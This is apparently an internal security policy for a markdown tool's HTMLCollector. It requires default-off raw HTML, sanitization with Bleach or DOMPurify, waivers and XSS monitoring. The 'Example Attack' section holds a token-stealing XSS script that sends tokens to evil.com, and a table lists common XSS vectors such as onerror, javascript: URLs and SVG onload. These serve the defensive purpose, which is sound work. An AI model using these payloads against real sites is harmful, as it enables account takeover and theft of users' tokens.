# ALLOW_RAW_HTML Policy

**Version**: 1.0
**Date**: 2025-10-16
**Severity**: 🔴 SECURITY-CRITICAL
**Source**: CLOSING_IMPLEMENTATION.md lines 524-591

---

## Policy Statement

HTMLCollector is **default-off** (fail-closed). Enabling raw HTML collection requires:

1. **Explicit approval**: Tech Lead approval via waiver (CODE_QUALITY.json waiver_policy)
2. **Documented sanitizer**: Must use Bleach or DOMPurify with strict allowlist
3. **Test coverage**: Litmus tests must pass (`test_html_render_litmus.py`)

**Default behavior**: `HTMLCollector(allow_html=False)` - HTML blocks are NOT collected.

---

## Security Risk

**Attack Vector**: Persistent XSS via unsanitized HTML
**CVSS Score**: 7.3 (High)
**Impact**: Arbitrary JavaScript execution in user browsers → account takeover

**Example Attack**:
```markdown
# Malicious Document

<script>
  fetch('/api/user/token').then(r => r.json()).then(t => {
    fetch('https://evil.com/steal?token=' + t.access_token);
  });
</script>
```

If HTMLCollector is enabled without sanitization, this script executes in admin/preview UIs.

---

## Approved Sanitizers

### Option 1: Bleach (Python - Recommended)

```python
from doxstrux.markdown.collectors_phase8.html_collector import HTMLCollector

# CORRECT: HTML enabled with Bleach sanitization
html_collector = HTMLCollector(
    allow_html=True,
    sanitize_on_finalize=True  # Uses Bleach with strict allowlist
)
```

**Bleach Configuration** (built into HTMLCollector):
```python
import bleach

safe_html = bleach.clean(
    raw_html,
    tags=['b', 'i', 'u', 'strong', 'em', 'p', 'ul', 'ol', 'li', 'a', 'img'],
    attributes={'a': ['href', 'title'], 'img': ['src', 'alt']},
    protocols=['http', 'https', 'mailto'],
    strip=True  # Remove disallowed tags entirely
)
```

### Option 2: DOMPurify (JavaScript - For Frontends)

If rendering HTML in JavaScript (e.g., React, Vue):

```javascript
import DOMPurify from 'dompurify';

const safeHtml = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'p', 'ul', 'ol', 'li', 'a', 'img'],
  ALLOWED_ATTR: ['href', 'title', 'src', 'alt'],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/
});

// Then render
element.innerHTML = safeHtml;
```

---

## Waiver Process

Per CODE_QUALITY.json waiver policy:

**Required Information**:
- **Ticket ID**: Links to requirement (e.g., JIRA-1234)
- **Approver**: Tech Lead (signature required)
- **Expires**: 30 days (auto-expire, must renew)
- **Risk Assessment**: Must document XSS risk acceptance and mitigation plan

**Approval Template**:
```yaml
waiver:
  type: ALLOW_RAW_HTML
  ticket: JIRA-1234
  approver: alice@example.com
  approved_date: 2025-10-16
  expires: 2025-11-15
  risk_assessment: |
    Raw HTML required for rich content editor preview.
    Mitigation: Bleach sanitization enabled (sanitize_on_finalize=True).
    Litmus tests passing (test_html_render_litmus.py).
  sanitizer: bleach
  test_coverage: test_html_render_litmus.py
```

---

## Forbidden Patterns

❌ **NEVER allow these without sanitization**:

| Pattern | Risk | Example |
|---------|------|---------|
| `<script>` tags | Arbitrary JS execution | `<script>alert('XSS')</script>` |
| Event handlers | JS execution on interaction | `<img onerror="alert('XSS')">` |
| `javascript:` URLs | JS execution on click | `<a href="javascript:alert(1)">` |
| `data:` URIs | Embedded scripts | `<img src="data:text/html,<script>...">` |
| SVG event handlers | JS execution | `<svg onload="alert('XSS')">` |
| `<iframe>` with srcdoc | Embedded XSS | `<iframe srcdoc="<script>...">` |

---

## Usage Examples

### ✅ CORRECT: Default (Fail-Closed)
```python
from doxstrux.markdown.collectors_phase8.html_collector import HTMLCollector

# HTML collection disabled (safe by default)
collector = HTMLCollector()
assert collector.allow_html is False  # Fail-closed
```

### ✅ CORRECT: Enabled with Sanitization
```python
# Explicit opt-in with Bleach sanitization
collector = HTMLCollector(
    allow_html=True,           # Explicit approval required
    sanitize_on_finalize=True  # Bleach strips dangerous content
)
```

### ❌ WRONG: Enabled without Sanitization
```python
# SECURITY VIOLATION - Allows XSS
collector = HTMLCollector(
    allow_html=True,
    sanitize_on_finalize=False  # ⚠️ DANGEROUS
)
# This requires waiver + documented risk acceptance
```

---

## Litmus Test Requirement

All changes to HTMLCollector must pass litmus tests:

```bash
cd /home/lasse/Documents/SERENA/MD_ENRICHER_cleaned
.venv/bin/python -m pytest \
  regex_refactor_docs/performance/skeleton/tests/test_html_render_litmus.py -v
```

**Expected Output**:
```
test_html_xss_litmus_script_tags PASSED
test_html_xss_litmus_svg_vectors PASSED
test_html_default_off_policy PASSED
test_allow_raw_html_flag_mechanism PASSED

4 passed in 0.X seconds
```

**If tests fail**: Do NOT enable `allow_html=True` in production until fixed.

---

## Deployment Checklist

Before enabling `allow_html=True` in production:

- [ ] Tech Lead waiver obtained (with ticket ID)
- [ ] Sanitizer configured (Bleach or DOMPurify)
- [ ] Litmus tests passing (4/4)
- [ ] Risk assessment documented
- [ ] Monitoring alerts configured (XSS detection)
- [ ] Incident response plan updated
- [ ] Waiver expiration date set (30 days max)

---

## Monitoring and Detection

**Recommended Alerts**:

1. **XSS Pattern Detection** (WAF/SIEM):
   - Alert on `<script>` in collected HTML
   - Alert on `javascript:` URLs
   - Alert on event handler attributes

2. **Sanitization Bypass Detection**:
   - Log all HTML blocks with `needs_sanitization=True`
   - Alert if sanitization fails (exception thrown)

3. **Configuration Audit**:
   - Alert if `allow_html=True` and `sanitize_on_finalize=False`
   - Periodic review of waiver expirations

**Example Log Format**:
```json
{
  "event": "html_collected",
  "allow_html": true,
  "sanitize_on_finalize": true,
  "needs_sanitization": true,
  "dangerous_patterns_detected": ["<script>", "onerror="],
  "sanitized": true,
  "timestamp": "2025-10-16T12:34:56Z"
}
```

---

## References

- **CLOSING_IMPLEMENTATION.md**: P0-2 specification (lines 338-600)
- **SECURITY_IMPLEMENTATION_STATUS.md**: Sec-D HTML/XSS status (lines 61-91)
- **test_html_render_litmus.py**: End-to-end sanitization tests
- **test_html_xss_end_to_end.py**: Collection-level XSS tests

---

## Revision History

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2025-10-16 | Initial policy (P0-2 implementation) |

---

**Last Updated**: 2025-10-16
**Owner**: Security Team
**Review Cycle**: Quarterly
**Next Review**: 2026-01-16
